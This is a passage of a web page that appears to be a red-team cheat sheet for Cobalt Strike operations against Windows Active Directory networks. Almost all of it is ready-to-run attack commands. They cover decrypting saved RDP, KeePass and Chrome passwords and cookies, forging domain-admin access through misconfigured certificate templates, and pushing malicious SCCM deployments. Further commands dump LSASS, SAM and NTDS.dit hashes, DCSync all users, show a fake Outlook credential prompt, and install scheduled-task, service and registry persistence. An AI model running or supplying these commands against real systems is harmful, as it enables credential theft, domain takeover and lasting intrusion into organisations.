<h3 id="decrypt-any-rdg-remote-desktop-passwords-found-using-the-domain-backup-key-can-also-use-local-admin-account-or-master-key">Decrypt any RDG (remote desktop) passwords found using the domain backup key (can also use local Admin account or master key)</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-74-1"><a id="__codelineno-74-1" name="__codelineno-74-1" href="#__codelineno-74-1"></a>execute-assembly C:\SharpDPAPI.exe rdg /pvk:key.pvk /unprotect
</span></code></pre></div>
<h3 id="decrypt-any-keepass-passwords-found-using-the-domain-backup-key-can-also-use-local-admin-account-or-master-key">Decrypt any KeePass passwords found using the domain backup key (can also use local Admin account or master key)</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-75-1"><a id="__codelineno-75-1" name="__codelineno-75-1" href="#__codelineno-75-1"></a>execute-assembly C:\SharpDPAPI.exe keepass /pvk:key.pvk /unprotect
</span></code></pre></div>
<p>SharpChrome to extract and decrypt a user's Chrome sessions/passwords</p>
<h3 id="dump-chrome-logins-on-the-local-system-for-the-current-user">Dump Chrome logins on the local system for the current user</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-76-1"><a id="__codelineno-76-1" name="__codelineno-76-1" href="#__codelineno-76-1"></a>execute-assembly C:\SharpChrome.exe logins /unprotect
</span></code></pre></div>
<h3 id="dump-chrome-cookies-on-the-local-system-for-the-current-user">Dump Chrome cookies on the local system for the current user</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-77-1"><a id="__codelineno-77-1" name="__codelineno-77-1" href="#__codelineno-77-1"></a>execute-assembly C:\SharpChrome.exe cookies
</span></code></pre></div>
<h3 id="dump-chrome-cookies-on-the-local-system-only-for-a-specific-url-output-in-json-format-to-import-into-cookie-editor-browser-extension">Dump Chrome cookies on the local system only for a specific URL - Output in JSON format to import into "Cookie Editor" browser extension</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-78-1"><a id="__codelineno-78-1" name="__codelineno-78-1" href="#__codelineno-78-1"></a>execute-assembly C:\SharpChrome.exe cookies /format:json /browser:chrome /url:&quot;.*microsoft.com&quot;
</span></code></pre></div>
<h3 id="dumping-chrome-login-passwords-on-remote-machines-using-the-domain-backup-key-can-also-use-local-user-password">Dumping Chrome login passwords on remote machines using the domain backup key (can also use local user password)</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-79-1"><a id="__codelineno-79-1" name="__codelineno-79-1" href="#__codelineno-79-1"></a>execute-assembly C:\SharpChrome.exe logins /pvk:key.pvk /server:SERVER.lab.com
</span></code></pre></div>
<h3 id="dumping-and-decryptiong-chrome-user-cookies-and-sessions-on-remote-machines-using-the-domain-backup-key-can-also-use-local-user-password">Dumping and decryptiong Chrome user cookies and sessions on remote machines using the domain backup key (can also use local user password)</h3>
<h3 id="cookies-can-then-be-imported-into-chromefirefox-using-the-extension-cookie-editor">Cookies can then be imported into Chrome/Firefox using the extension Cookie-Editor</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-80-1"><a id="__codelineno-80-1" name="__codelineno-80-1" href="#__codelineno-80-1"></a>execute-assembly C:\SharpChrome.exe cookies /pvk:key.pvk /server:SERVER.lab.com
</span></code></pre></div>
<h3 id="sharpweb-retrieve-saved-credentials-in-chrome-firefox-and-edge"><a href="https://github.com/djhohnstein/SharpWeb">SharpWeb</a> - Retrieve saved credentials in Chrome, Firefox and Edge</h3>
<p><div class="language-text highlight"><pre><span></span><code><span id="__span-81-1"><a id="__codelineno-81-1" name="__codelineno-81-1" href="#__codelineno-81-1"></a>###  Retrive all saved browser credentials
</span></code></pre></div>
execute-assembly C:\SharpWeb.exe all
<div class="language-text highlight"><pre><span></span><code><span id="__span-82-1"><a id="__codelineno-82-1" name="__codelineno-82-1" href="#__codelineno-82-1"></a>###  Active Directory Certificate Services (AD CS) Attack
</span><span id="__span-82-2"><a id="__codelineno-82-2" name="__codelineno-82-2" href="#__codelineno-82-2"></a>[Certify - GhostPack](https://github.com/GhostPack/Certify) &lt;br /&gt;
</span><span id="__span-82-3"><a id="__codelineno-82-3" name="__codelineno-82-3" href="#__codelineno-82-3"></a>Enumerate and abuse misconfigurations in AD CS &lt;br /&gt;
</span></code></pre></div></p>
<h3 id="find-vulnerable-certificates-with-certifyexe">Find vulnerable certificates with Certify.exe</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-83-1"><a id="__codelineno-83-1" name="__codelineno-83-1" href="#__codelineno-83-1"></a>execute-assembly C:\Certify.exe find /vulnerable /domain:lab.com
</span></code></pre></div>
<h3 id="request-a-new-certificate-for-a-vulnerable-template-from-the-above-output">Request a new certificate for a vulnerable template from the above output</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-84-1"><a id="__codelineno-84-1" name="__codelineno-84-1" href="#__codelineno-84-1"></a>execute-assembly C:\Certify.exe request /ca:lab.com\ops-dc01 /template:VulnTemplate /altname:DomainAdminUser1
</span></code></pre></div>
<h3 id="copy-the-certificate-private-key-from-the-above-output-to-a-file-then-request-a-tgt-using-the-certificate-file-with-rubeus">Copy the certificate private key from the above output to a file, then request a TGT using the certificate file with Rubeus</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-85-1"><a id="__codelineno-85-1" name="__codelineno-85-1" href="#__codelineno-85-1"></a>execute-assembly C:\Rubeus.exe asktgt /user:DomainAdminUser1 /certificate:C:\Temp\cert.pfx /domain:lab.com
</span></code></pre></div>
<p><a href="https://github.com/ly4k/Certipy">Certipy - Python</a><br />
Use Python through a SOCKS proxy or a Linux VM on the domain to find and exploit misconfigured AD CS certs<br /></p>
<h3 id="first-start-a-socks-proxy-in-cobalt-strike-or-skip-to-the-next-step-if-you-have-an-on-site-linux-vm">First, start a SOCKS proxy in Cobalt Strike (or skip to the next step if you have an on-site Linux VM)</h3>
<p><code>socks &lt;port&gt; socks5</code></p>
<h3 id="configure-proxychains-on-kalilinux-vm-to-proxy-traffic-through-c2">Configure proxychains on Kali/Linux VM to proxy traffic through C2</h3>
<h3 id="find-vulnerable-certs-with-certipy-through-proxy">Find vulnerable certs with Certipy through proxy</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-86-1"><a id="__codelineno-86-1" name="__codelineno-86-1" href="#__codelineno-86-1"></a>proxychains certipy find -u &#39;my-user@domain.com&#39; -p &#39;PASSWORD&#39; -dc-ip 10.100.32.200 -vulnerable -timeout 30
</span></code></pre></div>
<h3 id="request-a-certificate-for-a-vulnerable-cert-template-through-proxy">Request a certificate for a vulnerable cert template through proxy</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-87-1"><a id="__codelineno-87-1" name="__codelineno-87-1" href="#__codelineno-87-1"></a>proxychains certipy req -u &#39;my-user@domain.com&#39; -p &#39;PASSWORD&#39; -dc-ip 10.100.32.200 -ca corp-DC-CA -target ca.domain.com -template VulnTemplate -debug -upn &#39;DomainAdminAcc@domain.com&#39;
</span></code></pre></div>
<h3 id="authenticate-with-the-output-pfx-cert-file-to-reequset-a-tgt-for-the-domainadminacc-user">Authenticate with the output .PFX cert file to reequset a TGT for the DomainAdminAcc user</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-88-1"><a id="__codelineno-88-1" name="__codelineno-88-1" href="#__codelineno-88-1"></a>proxychains certipy auth -pfx DomainAdminAcc.pfx -username DomainAdminAcc -domain &#39;domain.com&#39; -dc-ip X.X.X.X 
</span><span id="__span-88-2"><a id="__codelineno-88-2" name="__codelineno-88-2" href="#__codelineno-88-2"></a>--&gt; Command will output NTLM hash of target account and the user&#39;s certificate
</span></code></pre></div>
<h3 id="use-the-output-certificate-of-the-domainadminacc-account-with-rubeus">Use the output certificate of the DomainAdminAcc account with Rubeus</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-89-1"><a id="__codelineno-89-1" name="__codelineno-89-1" href="#__codelineno-89-1"></a>execute-assembly C:\Rubeus.exe asktgt /user:DomainAdminAcc /certificate:DomainAdminAcc.pfx /ptt /domain:domain.com /dc:DomainController.domain.com
</span><span id="__span-89-2"><a id="__codelineno-89-2" name="__codelineno-89-2" href="#__codelineno-89-2"></a>ls \\DomainController\c$ --&gt; Verify command was successfully by doing an &#39;ls&#39; cmd on the DC
</span></code></pre></div>
<h3 id="malsccm-exploiting-sccm-servers-to-deploy-malicious-applications"><a href="https://github.com/nettitude/MalSCCM">MalSCCM</a> - Exploiting SCCM servers to deploy malicious applications<br /></h3>
<ul>
<li>Requires admin privileges on target SCCM server</li>
</ul>
<h3 id="find-the-sccm-management-servers">Find the SCCM management servers</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-90-1"><a id="__codelineno-90-1" name="__codelineno-90-1" href="#__codelineno-90-1"></a>execute-assembly C:\MalSCCM.exe locate
</span></code></pre></div>
<h3 id="check-if-the-current-host-is-an-sccm-client">Check if the current host is an SCCM client</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-91-1"><a id="__codelineno-91-1" name="__codelineno-91-1" href="#__codelineno-91-1"></a>execute-assembly C:\MalSCCM.exe
</span></code></pre></div>
<h3 id="gather-all-info-from-sccm-including-users-groups-forest-application-deployments">Gather all info from SCCM including users, groups, forest, application, deployments</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-92-1"><a id="__codelineno-92-1" name="__codelineno-92-1" href="#__codelineno-92-1"></a>execute-assembly C:\MalSCCM.exe inspect /all /server:&lt;PrimarySiteFQDN&gt;
</span></code></pre></div>
<h3 id="you-can-use-malsccm-to-deploy-a-malicious-application-to-a-target-group-then-force-the-users-to-check-in-and-run-your-payload">You can use MalSCCM to deploy a malicious application to a target group then force the users to check-in and run your payload</h3>
<h3 id="this-is-explained-in-much-more-details-in-the-walkthrough-here-httpslabsnettitudecomblogintroducing-malsccm">This is explained in MUCH more details in the walkthrough here: https://labs.nettitude.com/blog/introducing-malsccm/</h3>
<hr />
<h3 id="exfiltration-password-attacks">Exfiltration - Password Attacks</h3>
<h3 id="dumping-lsass-locally-all-commands-below-require-local-admin">Dumping LSASS locally (all commands below require local Admin)</h3>
<p><code>Mimikatz built-in to dump passwords/hashes to console</code></p>
<h3 id="works-against-most-updated-systems-with-avedr-if-running-as-system">Works against most updated systems with AV/EDR if running as SYSTEM</h3>
<p><code>logonpasswords</code></p>
<p>Dumping LSASS with ProcDump.exe (requires touching disk) (NOTE: Might get flagged by AV and raise alerts but can still output LSASS dump file)
<div class="language-text highlight"><pre><span></span><code><span id="__span-93-1"><a id="__codelineno-93-1" name="__codelineno-93-1" href="#__codelineno-93-1"></a>upload --&gt; ProcDump.exe
</span><span id="__span-93-2"><a id="__codelineno-93-2" name="__codelineno-93-2" href="#__codelineno-93-2"></a>run ProcDump.exe -accepteula -ma lsass.exe lsass.dmp
</span></code></pre></div>
Dumping LSASS with <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1">Out-Minidump.ps1 from PowerSploit</a> without touching disk
<div class="language-text highlight"><pre><span></span><code><span id="__span-94-1"><a id="__codelineno-94-1" name="__codelineno-94-1" href="#__codelineno-94-1"></a>powershell Get-Process | Out-Minidump -DumpFilePath C:\temp
</span></code></pre></div>
Extract LSASS process with <a href="https://github.com/GhostPack/SafetyKatz">SafetyKatz</a>
<div class="language-text highlight"><pre><span></span><code><span id="__span-95-1"><a id="__codelineno-95-1" name="__codelineno-95-1" href="#__codelineno-95-1"></a>execute-assembly C:\SafetyKatz.exe --&gt; Dumps LSASS process to .dmp file on the local system
</span></code></pre></div>
LSASS dump BOFs
<div class="language-text highlight"><pre><span></span><code><span id="__span-96-1"><a id="__codelineno-96-1" name="__codelineno-96-1" href="#__codelineno-96-1"></a>minidumpwritedump --&gt; https://github.com/rookuu/BOFs/tree/main/MiniDumpWriteDump
</span><span id="__span-96-2"><a id="__codelineno-96-2" name="__codelineno-96-2" href="#__codelineno-96-2"></a>nanodump --&gt; https://github.com/fortra/nanodump
</span><span id="__span-96-3"><a id="__codelineno-96-3" name="__codelineno-96-3" href="#__codelineno-96-3"></a>ppldump &lt;YOUR_PROTECTED_PROCESS_PID&gt; --&gt; https://github.com/EspressoCake/PPLDump_BOF
</span><span id="__span-96-4"><a id="__codelineno-96-4" name="__codelineno-96-4" href="#__codelineno-96-4"></a>static_syscalls_dump &lt;PID&gt; C:\Users\USER\Desktop\output.dmp --&gt; https://github.com/ajpc500/BOFs/blob/main/StaticSyscallsDump/README.md
</span></code></pre></div>
Extracting passwords/hashes offline from LSASS dump using Mimikatz (<strong>ON YOUR OWN SYSTEM!</strong>)
<div class="language-text highlight"><pre><span></span><code><span id="__span-97-1"><a id="__codelineno-97-1" name="__codelineno-97-1" href="#__codelineno-97-1"></a>mimikatz.exe log &quot;privilege::debug&quot; &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonpasswords /all&quot; &quot;sekurlsa::wdigest&quot; exit (Run on your local box)
</span></code></pre></div></p>
<h3 id="sam-database-dump">SAM database dump</h3>
<p>SAM dump built into CS - Injects into LSASS to dump local SAM database hashes to console
<div class="language-text highlight"><pre><span></span><code><span id="__span-98-1"><a id="__codelineno-98-1" name="__codelineno-98-1" href="#__codelineno-98-1"></a>hashdump
</span></code></pre></div>
SAM dump using reg.exe
<div class="language-text highlight"><pre><span></span><code><span id="__span-99-1"><a id="__codelineno-99-1" name="__codelineno-99-1" href="#__codelineno-99-1"></a>run reg.exe save HKLM\sam sam.save
</span><span id="__span-99-2"><a id="__codelineno-99-2" name="__codelineno-99-2" href="#__codelineno-99-2"></a>run reg.exe save HKLM\security security.save
</span><span id="__span-99-3"><a id="__codelineno-99-3" name="__codelineno-99-3" href="#__codelineno-99-3"></a>run reg.exe save HKLM\system system.save
</span></code></pre></div></p>
<h3 id="download-sam-files-then-dump-hahses-offline-using-secretsdumppy">Download SAM files then dump hahses offline using Secretsdump.py</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-100-1"><a id="__codelineno-100-1" name="__codelineno-100-1" href="#__codelineno-100-1"></a>download sam.save
</span><span id="__span-100-2"><a id="__codelineno-100-2" name="__codelineno-100-2" href="#__codelineno-100-2"></a>download security.save
</span><span id="__span-100-3"><a id="__codelineno-100-3" name="__codelineno-100-3" href="#__codelineno-100-3"></a>download system.save
</span><span id="__span-100-4"><a id="__codelineno-100-4" name="__codelineno-100-4" href="#__codelineno-100-4"></a>python secretsdump.py -sam sam.save -security security.save -system system.save LOCAL (Run **ON YOUR OWN SYSTEM**)
</span></code></pre></div>
<h3 id="sharpsecdump-sam-and-lsa-extraction"><a href="https://github.com/G0ldenGunSec/SharpSecDump">SharpSecDump</a> SAM and LSA extraction</h3>
<p>Remotely dump SAM and LSA secrets (same functionality as Impacket's secretsdump.py)</p>
<h3 id="runs-in-the-context-of-the-current-user">Runs in the context of the current user</h3>
<h3 id="local-admin-privileges-is-required-on-the-target-machine">Local Admin privileges is required on the target machine</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-101-1"><a id="__codelineno-101-1" name="__codelineno-101-1" href="#__codelineno-101-1"></a>execute-assembly C:\SharpSecDump.exe -target=192.168.1.15 -u=admin -p=Password123 -d=lab.local
</span></code></pre></div>
<h3 id="ntdsdit-dump-all-commands-below-require-domain-admin-privileges">### ###  NTDS.dit dump (all commands below require Domain Admin privileges!)</h3>
<p><a href="https://gist.github.com/monoxgas/9d238accd969550136db">Invoke-DCSync.ps1</a> to perform DCSync attacks remotely 
<div class="language-text highlight"><pre><span></span><code><span id="__span-102-1"><a id="__codelineno-102-1" name="__codelineno-102-1" href="#__codelineno-102-1"></a>powershell-import --&gt; Invoke-DCSync.ps1
</span></code></pre></div></p>
<h3 id="perform-dc-sync-hash-dump-for-all-users-in-the-target-domain">Perform DC Sync hash dump for all users in the target domain</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-103-1"><a id="__codelineno-103-1" name="__codelineno-103-1" href="#__codelineno-103-1"></a>powershell Invoke-DCSync -Domain lab.local [-DomainController ops-dc01.lab.local] 
</span></code></pre></div>
<h3 id="perform-dc-sync-hash-dump-for-all-users-in-the-specified-group">Perform DC Sync hash dump for all users in the specified group</h3>
<p><div class="language-text highlight"><pre><span></span><code><span id="__span-104-1"><a id="__codelineno-104-1" name="__codelineno-104-1" href="#__codelineno-104-1"></a>powershell Invoke-DCSync -Domain lab.local -GroupName &quot;Domain Admins&quot; | ft -wrap -autosize
</span></code></pre></div>
<a href="https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1">Copy-VSS.ps1 from Nishang toolkit</a> to dump NTDS.dit locally on the DC
<div class="language-text highlight"><pre><span></span><code><span id="__span-105-1"><a id="__codelineno-105-1" name="__codelineno-105-1" href="#__codelineno-105-1"></a>powershell-import --&gt; Copy-VSS.ps1
</span><span id="__span-105-2"><a id="__codelineno-105-2" name="__codelineno-105-2" href="#__codelineno-105-2"></a>powerpick Copy-VSS -DestinationDir C:\temp
</span><span id="__span-105-3"><a id="__codelineno-105-3" name="__codelineno-105-3" href="#__codelineno-105-3"></a>
</span><span id="__span-105-4"><a id="__codelineno-105-4" name="__codelineno-105-4" href="#__codelineno-105-4"></a>NTDSutil.exe to dump NTDS.dit locally on a Domain Controller
</span><span id="__span-105-5"><a id="__codelineno-105-5" name="__codelineno-105-5" href="#__codelineno-105-5"></a>
</span><span id="__span-105-6"><a id="__codelineno-105-6" name="__codelineno-105-6" href="#__codelineno-105-6"></a>run ntdsutil.exe activate instance ntds,ifm,create full C:\ntdsutil,quit,quit | ntdsutil
</span></code></pre></div></p>
<h3 id="credential-prompt">Credential Prompt</h3>
<p><a href="https://github.com/guervild/BOFs/tree/dev/CredPrompt">CredPrompt</a> to ask the current user for their username/password.
<div class="language-text highlight"><pre><span></span><code><span id="__span-106-1"><a id="__codelineno-106-1" name="__codelineno-106-1" href="#__codelineno-106-1"></a>credprompt &quot;Credentials are required to re-authenticate to Outlook:&quot;
</span></code></pre></div></p>
<hr />
<h3 id="exfiltration-email">Exfiltration - Email</h3>
<h3 id="mailsniper"><a href="https://github.com/dafthack/MailSniper">MailSniper</a></h3>
<p>PowreShell tool to search mailboxes in a Microsoft Exchange environment
<div class="language-text highlight"><pre><span></span><code><span id="__span-107-1"><a id="__codelineno-107-1" name="__codelineno-107-1" href="#__codelineno-107-1"></a>powershell-import -&gt; Select MailSniper.ps1
</span></code></pre></div></p>
<h3 id="search-all-mailboxes-in-a-domain-looks-for-passwordcredscredentials">Search all mailboxes in a domain - Looks for "<em>password</em>","<em>creds</em>","<em>credentials</em>"</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-108-1"><a id="__codelineno-108-1" name="__codelineno-108-1" href="#__codelineno-108-1"></a>powershell Invoke-GlobalMailSearch -ImpersonationAccount current-username -ExchHostname ExchangeHost.domain.com -OutputCsv global-email-search.csv
</span></code></pre></div>
<h3 id="search-the-current-users-mailbox">Search the current users mailbox</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-109-1"><a id="__codelineno-109-1" name="__codelineno-109-1" href="#__codelineno-109-1"></a>powershell Invoke-SelfSearch -Mailbox current-user@domain.com
</span></code></pre></div>
<h3 id="get-the-global-address-list-gal">Get the Global Address List (GAL)</h3>
<h2 id="powershell-get-globaladdresslist-exchhostname-exchangehostdomaincom-username-domainusername-password-pssw0rd-outfile-galtxt"><div class="language-text highlight"><pre><span></span><code><span id="__span-110-1"><a id="__codelineno-110-1" name="__codelineno-110-1" href="#__codelineno-110-1"></a>powershell Get-GlobalAddressList -ExchHostname ExchangeHost.domain.com -UserName domain\username -Password P@ssw0rd! -OutFile gal.txt
</span></code></pre></div></h2>
<h3 id="persistence">Persistence</h3>
<p><a href="https://github.com/0xthirteen/SharpStay">SharpStay</a> - .NET Persistence</p>
<h3 id="scheduled-task-persistence">Scheduled task persistence</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-111-1"><a id="__codelineno-111-1" name="__codelineno-111-1" href="#__codelineno-111-1"></a>execute-assembly C:\Sharpstay.exe action=ScheduledTask taskname=TestTask command=&quot;C:\windows\temp\file.exe&quot; runasuser=testuser triggertype=logon author=Microsoft Corp. description=&quot;Test Task&quot; logonuser=testuser
</span></code></pre></div>
<h3 id="service-creation-persistence">Service creation persistence</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-112-1"><a id="__codelineno-112-1" name="__codelineno-112-1" href="#__codelineno-112-1"></a>execute-assembly C:\Sharpstay.exe action=CreateService servicename=TestService command=&quot;C:\Windows\temp\file.exe&quot;
</span></code></pre></div>
<h3 id="user-registry-key-persistence">User registry key persistence</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-113-1"><a id="__codelineno-113-1" name="__codelineno-113-1" href="#__codelineno-113-1"></a>execute-assembly C:\Sharpstay.exe action=UserRegistryKey keyname=Debug keypath=HKCU:Software\Microsoft\Windows\CurrentVersion\Run command=&quot;C:\Windows\temp\file.exe&quot;
</span></code></pre></div>
<h3 id="many-other-methods-available-on-the-tools-github-documentation">Many other methods available on the tool's github documentation</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-114-1"><a id="__codelineno-114-1" name="__codelineno-114-1" href="#__codelineno-114-1"></a>[SharpPersist](https://github.com/fireeye/SharPersist)
</span></code></pre></div>
<h3 id="list-persistence-entries">List persistence entries</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-115-1"><a id="__codelineno-115-1" name="__codelineno-115-1" href="#__codelineno-115-1"></a>execute-assembly C:\SharPersist.exe -t [reg,schtaskbackdoor,startupfolder,service] -m list
</span></code></pre></div>
<h3 id="registy-persistence">Registy persistence</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-116-1"><a id="__codelineno-116-1" name="__codelineno-116-1" href="#__codelineno-116-1"></a>execute-assembly C:\SharPersist.exe -t reg -c &quot;C:\Windows\System32\cmd.exe&quot; -a &quot;/c payload.exe&quot; -k &quot;hkcurun&quot; -v &quot;Test Payload&quot; -m add -o env
</span></code></pre></div>
<h3 id="scheduled-task-backdoor-persistence">Scheduled task backdoor persistence</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-117-1"><a id="__codelineno-117-1" name="__codelineno-117-1" href="#__codelineno-117-1"></a>execute-assembly C:\SharPersist.exe -t schtaskbackdoor -c &quot;C:\Windows\System32\cmd.exe&quot; -a &quot;/c payload.exe&quot; -n &quot;Test Scheduled Task&quot; -m add -o daily
</span></code></pre></div>
<h3 id="startup-folder-persistence">Startup folder persistence</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-118-1"><a id="__codelineno-118-1" name="__codelineno-118-1" href="#__codelineno-118-1"></a>execute-assembly C:\SharPersist.exe -t startupfolder -c &quot;C:\Windows\System32\cmd.exe&quot; -a &quot;/c payload.exe&quot; -f &quot;Test File on Startup&quot; -m add
</span></code></pre></div>
<h3 id="windows-service-persistence">Windows service persistence</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-119-1"><a id="__codelineno-119-1" name="__codelineno-119-1" href="#__codelineno-119-1"></a>execute-assembly C:\SharPersist.exe -t service -c &quot;C:\Windows\System32\cmd.exe&quot; -a &quot;/c payload.exe&quot; -n &quot;Test Service&quot; -m add
</span></code></pre></div>
<p><a href="https://github.com/0xthirteen/StayKit">StayKit</a> - Cobalt Strike persistence kit aggressor script</p>
<hr />
<h3 id="cobalt-strike-bofs">Cobalt Strike BOFs</h3>
<p><a href="https://github.com/wsummerhill/CobaltStrike_BOF_Collections">My BOF Collection GitHub page</a></p>
<h3 id="bofnet"><a href="https://github.com/CCob/BOF.NET/pull/1">BOF.NET</a></h3>
<p>A .NET runtime tool to load assemblies in memory and avoid the typical fork-and-run model from <code>execute-assembly</code>. Use BOF.NET to run any .NET tool for better evasion by residing in your current process. Note that this will not bypass AMSI or ETW as those will have to be unhooked separately, if needed.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-120-1"><a id="__codelineno-120-1" name="__codelineno-120-1" href="#__codelineno-120-1"></a>bofnet_init
</span><span id="__span-120-2"><a id="__codelineno-120-2" name="__codelineno-120-2" href="#__codelineno-120-2"></a>bofnet_load /path/to/assembly.exe
</span><span id="__span-120-3"><a id="__codelineno-120-3" name="__codelineno-120-3" href="#__codelineno-120-3"></a>bofnet_listassemblies
</span><span id="__span-120-4"><a id="__codelineno-120-4" name="__codelineno-120-4" href="#__codelineno-120-4"></a>bofnet_executeassembly AssemblyName argument1 argument2 
</span></code></pre></div>
<hr />
<h3 id="references">References</h3>
<p><a href="https://github.com/S1ckB0y1337/Cobalt-Strike-CheatSheet">Cobalt Strike commands cheat sheet</a> </p>
<p><a href="https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet">AD exploitation cheat sheet</a> </p>
<p><a href="https://github.com/BloodHoundAD/SharpHound3">Sharphound</a> </p>
<p><a href="https://blog.netspi.com/powershell-remoting-cheatsheet/">PowerShell remoting cheat sheet</a> </p>
<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md">Mimikatz reference cheat sheet</a> </p>
<p><a href="https://xzfile.aliyuncs.com/upload/affix/20190126174144-9767f9f2-214e-1.pdf">SpectreOps Cobalt Strike command reference</a> </p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../methods/external/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../methods/external/" class="btn btn-xs btn-link">
        External
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../../web/wordlists/s0md3v_XSS.txt" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../../web/wordlists/s0md3v_XSS.txt" class="btn btn-xs btn-link">
        s0md3v_XSS
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content">
      <p>
        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/explore/resource/csrredteam.md"><i class="fa fa-github"></i>
Edit on GitHub</a>
      </p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
</footer>

</body>
</html>